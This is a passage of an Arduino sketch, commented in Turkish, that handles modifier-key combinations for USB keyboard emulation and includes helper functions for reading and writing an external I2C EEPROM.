    delay(45);
  }

  if ((ctrlControl == 1 || altControl == 1 || shiftControl == 1 || guiControl == 1) && special_tut == 1 && SPECIAL_yeniZaman - SPECIAL_eskiZaman > 500) {

    Keyboard.press(specialChar);
    Serial.println(specialChar);
    delay(25);
  }

  // special tusla kombinasyon yapakerken ctrl vs. ilk basimda 300milisaniye bekletmek icin
  if ((ctrlControl == 1 || altControl == 1 || shiftControl == 1 || guiControl == 1) && special_tut == 1 && specialKapa == 0) {

    Keyboard.print(specialChar);
    Serial.println(specialChar);
    delay(300);
    specialKapa = 1;
  }

  // eger kombinasyon tusuna  basili tutuluyor ve herhangi bir ozel veya normal tusa basiliyorsa
  if (controlKeyChecked == 1 && (tut == 0 || special_tut == 1)) {
    pastKeyChecked = 1;  // normal veya ozel tusa combinasyonla basilmissa = 1 ex/. ctrl + z
  }

  // normal veya ozel tusa kombinasyonlar bastik ama sonra normal veya ozel tusa basmayi kestik ama kombiansyon tusuan hala basili tutuyoruz
  if (pastKeyChecked == 1 && (tut == 1 && special_tut == 0) && controlKeyChecked == 1) {
    pastKeyChecked = 2;
    combinePress = 0;
  }
}

void writeEEPROM(int deviceaddress, unsigned int eeaddress, byte data )
{
  Wire.beginTransmission(deviceaddress);
  Wire.write((int)(eeaddress >> 8));   // MSB
  Wire.write((int)(eeaddress & 0xFF)); // LSB
  Wire.write(data);
  Wire.endTransmission();

  delay(5);
}

byte readEEPROM(int deviceaddress, unsigned int eeaddress )
{
  byte rdata = 0xFF;

  Wire.beginTransmission(deviceaddress);
  Wire.write((int)(eeaddress >> 8));   // MSB
  Wire.write((int)(eeaddress & 0xFF)); // LSB
  Wire.endTransmission();

  Wire.requestFrom(deviceaddress, 1);

  if (Wire.available()) rdata = Wire.read();

  return rdata;
}

